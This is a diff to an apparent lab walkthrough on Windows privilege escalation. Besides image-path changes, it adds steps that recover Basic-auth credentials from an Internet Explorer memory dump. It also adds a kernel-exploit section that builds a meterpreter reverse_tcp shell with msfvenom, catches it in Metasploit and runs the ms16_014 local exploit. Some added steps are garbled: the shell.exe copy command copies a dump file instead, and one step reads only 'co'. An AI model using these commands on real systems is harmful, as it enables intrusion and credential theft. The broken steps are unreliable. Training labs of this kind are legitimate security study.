@@ -171,7 +171,7 @@ C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
 2\. In Autoruns, click on the ‘Logon’ tab.\
 3\. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
 
-<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 4\. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
@@ -184,7 +184,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 
 5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -255,12 +255,12 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 
 1\. Wait for a new session to open in Metasploit.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
 3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -278,7 +278,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2.From the output, notice that “AlwaysInstallElevated” value is 1.\
 3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
@@ -289,7 +289,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 4.From the output, notice that “AlwaysInstallElevated” value is 1.
 
@@ -371,7 +371,7 @@ sessions -i 1
 getuid
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Registry
 
@@ -388,7 +388,7 @@ getuid
 Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -503,11 +503,11 @@ subl windows_service.c
 
 **From**
 
-<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **To**
 
-<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 2\. Exit the text editor and compile the file by typing the following in the command prompt: x86\_64-w64-mingw32-gcc windows\_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')&#x20;
@@ -558,7 +558,7 @@ sc start regsvc
 net localgroup administrators 
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Executable Files
 
@@ -607,7 +607,7 @@ sc start filepermsvc
 net localgroup administrators
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation - Startup Applications
 
@@ -626,7 +626,7 @@ icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 \
 2\. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -693,7 +693,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568 /
 getuid
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - DLL Hijacking
 
@@ -704,7 +704,7 @@ getuid
 1\. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.\
 2\. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 3\. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.\
 4\. In the input box on the same line type: dllhijackservice.exe
@@ -713,17 +713,17 @@ getuid
 5\. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.\
 
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 6\. Next, select from the left-most drop down menu ‘Result’.\
 
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 7\. In the input box on the same line type: NAME NOT FOUND\
 8\. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 9\. Open command prompt and type: sc start dllsvc
@@ -826,7 +826,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
 
 2\. Notice that the output suggests that the user “User-PC\User” has the “SERVICE\_CHANGE\_CONFIG” permission.
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -858,7 +858,7 @@ sc start daclsvc
 net localgroup administrators
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Unquoted Service Paths
 
@@ -953,7 +953,7 @@ msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-se
 copy \\tsclient\kali\common.exe  "C:\Program Files\Unquoted Path Service\common.exe"
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -977,7 +977,7 @@ sc start unquotedsvc
 net localgroup administrators
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Potato Escalation - Hot Potato
 
@@ -1074,6 +1074,7 @@ msfconsole
 ```
 use auxiliary/server/capture/http_basic
 set uripath x
+set srvport 82
 run
 ```
 
@@ -1081,8 +1082,15 @@ run
 
 Windows VM
 
-1.Open Internet Explorer and browse to: http://\[Kali VM IP Address]/x\
-2.Open command prompt and type: taskmgr
+1. Open Internet Explorer and browse to: http://\[Kali VM IP Address]/x
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+
+
+2\. Open command prompt and type: taskmgr
 
 **Victim**
 
@@ -1091,35 +1099,127 @@ taskmgr
 ```
 
 \
-3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.\
+3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” column and select “Create Dump File” from the popup menu.\
+
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
 4.Copy the generated file, iexplore.DMP, to the Kali VM.
 
 **Victim**
 
 ```
-copy \\tsclient\kali\common.exe  "C:\Program Files\Unquoted Path Service\common.exe"
+copy "C:\Users\user\AppData\Local\Temp\iexplore.DMP" \\tsclient\kali\iexplore.DMP 
 ```
 
+\
+1.Open command prompt and type: strings iexplore.DMP | grep "Authorization: Basic"
 
+**Kali**
 
-Kali VM
+```
+strings iexplore.DMP | grep "Authorization: Basic"
+```
 
-1.Place ‘iexplore.DMP’ on the desktop.\
-2.Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"\
-3.Select the Copy the Base64 encoded string.\
-4.In command prompt type: echo -ne \[Base64 String] | base64 -d
+\
+2.Select the Copy the Base64 encoded string.\
+3.In command prompt type: echo -ne \[Base64 String] | base64 -d
 
 **Victim**
 
 ```
+echo -ne [Base64 String] | base64 -d
 ```
 
 \
 5.Notice the credentials in the output.
 
+## Privilege Escalation - Kernel Exploits
+
+### Establish a shell 
+
+Kali VM
+
+1\. Open command prompt and type: msfconsole
+
+**Kali**
+
+```
+msfconsole
+```
+
+\
+2\. In Metasploit (msf > prompt) type: use multi/handler\
+3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp\
+4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]\
+5\. In Metasploit (msf > prompt) type: run
+
+**Kali(msfconsole)**
+
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost $KALI
+run
+```
+
+\
+6\. Open an additional command prompt and type: msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f exe > shell.exe
+
+**Kali**
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$KALI -f exe > shell.exe
+```
+
+\
+7\. Copy the generated file, shell.exe, to the Windows VM.\
+
+
+**Kali**
+
+```
+copy  \\tsclient\kali\iexplore.DMP "C:\Users\user\AppData\Local\Temp\iexplore.DMP" 
+```
 
 
 
+Windows VM
+
+1\. Execute shell.exe and obtain reverse shell
+
+**Victim**
+
+```
+co
+```
+
+### Detection & Exploitation 
+
+Kali VM
+
+1\. In Metasploit (msf > prompt) type: run post/multi/recon/local\_exploit\_suggester\
+2\. Identify exploit/windows/local/ms16\_014\_wmi\_recv\_notif as a potential privilege escalation\
+3\. In Metasploit (msf > prompt) type: use exploit/windows/local/ms16\_014\_wmi\_recv\_notif\
+4\. In Metasploit (msf > prompt) type: set SESSION \[meterpreter SESSION number]\
+5\. In Metasploit (msf > prompt) type: set LPORT 5555\
+6\. In Metasploit (msf > prompt) type: run
+
+**Kali(msfconsole)**
+
+```
+run post/multi/recon/local_exploit_suggester
+use exploit/windows/local/ms16_014_wmi_recv_notif
+set SESSION $SESSION
+set LPORT 5555
+run
+```
+
+
+
+NOTE: The shell might default to your eth0 during this attack.  If so, ensure you type set lhost \[Kali VM IP Address] and run again.
 
 
 
